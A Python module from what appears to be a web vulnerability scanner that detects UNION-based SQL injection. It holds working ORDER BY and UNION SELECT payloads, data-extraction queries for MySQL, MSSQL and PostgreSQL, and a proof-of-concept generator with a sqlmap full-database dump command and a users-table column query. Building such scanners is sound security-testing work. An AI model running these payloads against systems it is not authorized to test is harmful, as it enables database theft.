"""
SQL Injection - UNION-Based Scanner
=====================================

Detects SQL injection that allows data extraction using UNION SELECT
to combine results from the original query with attacker-controlled data.

Detection Flow:
1. Determine number of columns with ORDER BY
2. Find displayable columns with UNION SELECT NULL
3. Replace NULLs with data extraction queries
4. Verify extracted data in response

This is the most powerful SQLi type for data extraction.
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs
import aiohttp

from .base import SQLiBase, SQLiResult, DatabaseType

logger = logging.getLogger(__name__)


class SQLiUnionBased(SQLiBase):
    """
    Scanner for UNION-Based SQL Injection.
    
    Sub-type: union_based
    OWASP: A03:2021 - Injection
    CWE: CWE-89
    """
    
    SUB_TYPE = "union_based"
    TITLE_FORMAT = "SQL Injection (UNION-Based) - {param}"
    
    # Column count detection payloads
    ORDER_BY_PAYLOADS = [
        "' ORDER BY {n}--",
        "' ORDER BY {n}#",
        "') ORDER BY {n}--",
        "')) ORDER BY {n}--",
        "1' ORDER BY {n}--",
    ]
    
    # UNION SELECT payloads (null-based column detection)
    UNION_PAYLOADS = {
        'generic': "' UNION SELECT {nulls}--",
        'mysql': "' UNION SELECT {nulls}-- -",
        'mssql': "' UNION SELECT {nulls}--",
        'postgresql': "' UNION SELECT {nulls}--",
        'oracle': "' UNION SELECT {nulls} FROM DUAL--",
    }
    
    # Marker for finding output column
    JARWIS_MARKER = "JARWIS_SQLI_UNION_12345"
    
    # Data extraction payloads
    EXTRACTION_PAYLOADS = {
        DatabaseType.MYSQL: {
            'version': "@@VERSION",
            'user': "USER()",
            'database': "DATABASE()",
            'tables': "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())",
        },
        DatabaseType.MSSQL: {
            'version': "@@VERSION",
            'user': "USER_NAME()",
            'database': "DB_NAME()",
            'tables': "(SELECT STRING_AGG(name,',') FROM sys.tables)",
        },
        DatabaseType.POSTGRESQL: {
            'version': "VERSION()",
            'user': "CURRENT_USER",
            'database': "CURRENT_DATABASE()",
            'tables': "(SELECT STRING_AGG(tablename,',') FROM pg_tables WHERE schemaname='public')",
        },
    }
    
    MAX_COLUMNS = 20  # Maximum columns to test
    
    async def scan(self) -> List[SQLiResult]:
        """Run UNION-Based SQLi scan"""
        logger.info(f"Starting UNION-Based SQLi scan for {self.context.target_url}")
        
        urls_to_test = await self._get_test_urls()
        
        async with aiohttp.ClientSession() as session:
            for url, method in urls_to_test:
                await self._scan_url(session, url, method)
                await asyncio.sleep(1 / self.rate_limit)
        
        logger.info(f"UNION-Based SQLi scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings
    
    async def _get_test_urls(self) -> List[tuple]:
        """Get URLs with parameters to test"""
        urls = []
        
        if '?' in self.context.target_url:
            urls.append((self.context.target_url, 'GET'))
        
        if hasattr(self.context, 'crawl_results'):
            for page in self.context.crawl_results:
                if '?' in page.get('url', ''):
                    urls.append((page['url'], page.get('method', 'GET')))
        
        seen = set()
        unique = []
        for url, method in urls:
            key = f"{method}:{url}"
            if key not in seen and self._is_in_scope(url):
                seen.add(key)
                unique.append((url, method))
        
        return unique
    
    async def _scan_url(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str
    ) -> None:
        """Scan a single URL for UNION-based SQLi"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Get baseline
            baseline_status, baseline_body, _ = await self._get_baseline(session, url, method)
            
            for param in params.keys():
                result = await self._test_parameter(session, url, method, param, baseline_body)
                if result:
                    self.findings.append(result)
                    
        except Exception as e:
            logger.error(f"Error scanning {url}: {e}")
    
    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        baseline_body: str
    ) -> Optional[SQLiResult]:
        """Test a parameter for UNION-based SQLi"""
        
        # Step 1: Determine column count using ORDER BY
        column_count = await self._find_column_count(session, url, method, param, baseline_body)
        
        if column_count == 0:
            return None
        
        logger.debug(f"Found {column_count} columns for {param}")
        
        # Step 2: Find injectable column using UNION SELECT
        injectable_col, db_type = await self._find_injectable_column(
            session, url, method, param, column_count
        )
        
        if injectable_col is None:
            return None
        
        logger.debug(f"Found injectable column {injectable_col} for {param}")
        
        # Step 3: Extract sample data to prove exploitation
        extracted_data = await self._extract_data(
            session, url, method, param, column_count, injectable_col, db_type
        )
        
        # Build the successful payload
        nulls = ','.join(['NULL'] * column_count)
        nulls_list = nulls.split(',')
        nulls_list[injectable_col] = f"'{self.JARWIS_MARKER}'"
        final_payload = f"' UNION SELECT {','.join(nulls_list)}--"
        
        # Get final response for evidence
        test_url = self._inject_payload(url, param, final_payload)
        async with session.get(test_url, headers=self.DEFAULT_HEADERS, ssl=False) as resp:
            final_body = await resp.text()
            final_status = resp.status
            final_headers = dict(resp.headers)
        
        return SQLiResult(
            id=self._generate_finding_id("SQLI-UNION"),
            category="A03:2021 - Injection",
            sub_type=self.SUB_TYPE,
            severity="critical",
            title=self.TITLE_FORMAT.format(param=param),
            description=self._build_description(param, column_count, injectable_col, db_type, extracted_data),
            url=url,
            method=method,
            parameter=param,
            payload=final_payload,
            evidence=f"UNION injection successful. Columns: {column_count}, Injectable column: {injectable_col}\n\nExtracted data:\n{extracted_data}",
            poc=self._build_poc(url, param, column_count, injectable_col, db_type),
            reasoning=self._build_reasoning(column_count, injectable_col, db_type),
            request_data=self._format_request(method, test_url, self.DEFAULT_HEADERS),
            response_data=self._format_response(final_status, final_headers, final_body),
            confidence=0.95,  # Very high - we extracted data
            database_type=db_type,
            extracted_data=extracted_data,
            verification_status="verified",
            cwe_id="CWE-89",
            remediation=self._build_remediation(),
        )
    
    async def _find_column_count(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        baseline_body: str
    ) -> int:
        """Find number of columns using ORDER BY technique"""
        
        for payload_template in self.ORDER_BY_PAYLOADS:
            # Binary search for column count
            low, high = 1, self.MAX_COLUMNS
            last_valid = 0
            
            while low <= high:
                mid = (low + high) // 2
                payload = payload_template.format(n=mid)
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    async with session.get(
                        test_url,
                        headers=self.DEFAULT_HEADERS,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        ssl=False
                    ) as response:
                        body = await response.text()
                        
                        # Check if ORDER BY succeeded (no error)
                        has_error, _ = self._has_sql_error(body)
                        
                        if not has_error and response.status == 200:
                            last_valid = mid
                            low = mid + 1
                        else:
                            high = mid - 1
                            
                except Exception:
                    high = mid - 1
            
            if last_valid > 0:
                return last_valid
        
        return 0
    
    async def _find_injectable_column(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        column_count: int
    ) -> Tuple[Optional[int], DatabaseType]:
        """Find which column can display output"""
        
        # Try each position with our marker
        for i in range(column_count):
            nulls = ['NULL'] * column_count
            nulls[i] = f"'{self.JARWIS_MARKER}'"
            
            for db_name, payload_template in self.UNION_PAYLOADS.items():
                payload = payload_template.format(nulls=','.join(nulls))
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    async with session.get(
                        test_url,
                        headers=self.DEFAULT_HEADERS,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        ssl=False
                    ) as response:
                        body = await response.text()
                        
                        if self.JARWIS_MARKER in body:
                            db_type = self._db_name_to_type(db_name)
                            return i, db_type
                            
                except Exception:
                    continue
        
        return None, DatabaseType.UNKNOWN
    
    def _db_name_to_type(self, name: str) -> DatabaseType:
        """Convert database name to DatabaseType enum"""
        mapping = {
            'mysql': DatabaseType.MYSQL,
            'mssql': DatabaseType.MSSQL,
            'postgresql': DatabaseType.POSTGRESQL,
            'oracle': DatabaseType.ORACLE,
            'sqlite': DatabaseType.SQLITE,
        }
        return mapping.get(name, DatabaseType.UNKNOWN)
    
    async def _extract_data(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        column_count: int,
        injectable_col: int,
        db_type: DatabaseType
    ) -> str:
        """Extract sample data to prove exploitation"""
        
        extracted = []
        
        payloads = self.EXTRACTION_PAYLOADS.get(db_type, self.EXTRACTION_PAYLOADS[DatabaseType.MYSQL])
        
        for data_type, extraction_query in payloads.items():
            nulls = ['NULL'] * column_count
            nulls[injectable_col] = extraction_query
            
            payload = f"' UNION SELECT {','.join(nulls)}--"
            test_url = self._inject_payload(url, param, payload)
            
            try:
                async with session.get(
                    test_url,
                    headers=self.DEFAULT_HEADERS,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ssl=False
                ) as response:
                    body = await response.text()
                    
                    # Try to find extracted data in response
                    # Look for database-specific patterns
                    value = self._extract_value_from_response(body, data_type)
                    if value:
                        extracted.append(f"{data_type}: {value}")
                        
            except Exception as e:
                logger.debug(f"Extraction error: {e}")
        
        return '\n'.join(extracted) if extracted else "(Data extraction possible but values not visible in response)"
    
    def _extract_value_from_response(self, body: str, data_type: str) -> Optional[str]:
        """Try to extract the value from response"""
        
        # Common patterns for extracted data
        patterns = {
            'version': [
                r'(\d+\.\d+\.\d+[-\w]*)',  # Version number
                r'(MySQL|PostgreSQL|Microsoft SQL Server|Oracle)[\s\d\.]+',
            ],
            'user': [
                r'(root@[\w\.]+)',
                r'([\w]+@[\w\.]+)',
            ],
            'database': [
                r'([a-zA-Z_][\w_]+)',  # Simple name
            ],
        }
        
        for pattern in patterns.get(data_type, []):
            match = re.search(pattern, body)
            if match:
                return match.group(1)
        
        return None
    
    def _build_description(
        self, 
        param: str, 
        columns: int, 
        injectable: int, 
        db_type: DatabaseType,
        extracted: str
    ) -> str:
        """Build vulnerability description"""
        return f"""A UNION-Based SQL Injection vulnerability was identified in the '{param}' parameter.

**Type:** UNION-Based SQL Injection
**Database:** {db_type.value.upper()}

The application is vulnerable to UNION SELECT injection, allowing direct data extraction from the database.

**Technical Details:**
- Number of columns: {columns}
- Injectable column position: {injectable} (0-indexed)
- Database fingerprinted: {db_type.value}

**Extracted Data Sample:**
```
{extracted}
```

**Attack Capabilities:**
- Extract all table names and schemas
- Dump entire database contents
- Read sensitive files (with FILE privilege)
- Write files to server (with FILE privilege)
- Potentially execute OS commands

**Severity:** CRITICAL - Complete database compromise possible.
"""
    
    def _build_poc(
        self, 
        url: str, 
        param: str, 
        columns: int, 
        injectable: int,
        db_type: DatabaseType
    ) -> str:
        """Build Proof of Concept"""
        
        nulls = ['NULL'] * columns
        nulls[injectable] = 'VERSION()'
        extraction_payload = f"' UNION SELECT {','.join(nulls)}--"
        
        return f"""### Proof of Concept

**Vulnerable URL:**
```
{url}
```

**Vulnerable Parameter:** `{param}`

**Step 1: Find Column Count**
```
' ORDER BY 1-- (success)
' ORDER BY 2-- (success)
...
' ORDER BY {columns}-- (success)
' ORDER BY {columns + 1}-- (error - too many columns)
```
→ Query has {columns} columns

**Step 2: Find Injectable Column**
```
' UNION SELECT {'NULL,'*(injectable)}'{self.JARWIS_MARKER}',{'NULL'*(columns-injectable-1)}--
```
→ Column {injectable} displays output

**Step 3: Extract Data**
```
{extraction_payload}
```

**Full Dump Command (sqlmap):**
```bash
sqlmap -u "{url}" -p {param} --dbms={db_type.value} --dump --batch
```

**Extract Specific Table:**
```sql
' UNION SELECT {','.join(['NULL' if i != injectable else 'GROUP_CONCAT(column_name)' for i in range(columns)])} FROM information_schema.columns WHERE table_name='users'--
```
"""
    
    def _build_reasoning(self, columns: int, injectable: int, db_type: DatabaseType) -> str:
        """Build verification reasoning"""
        return f"""✓ Column count determined: {columns} columns
✓ Injectable column found at position {injectable}
✓ UNION SELECT payload accepted by database
✓ Custom marker appeared in response
✓ Database fingerprinted as {db_type.value}
✓ Data extraction confirmed

This is a confirmed UNION-based SQL injection with full data extraction capability."""
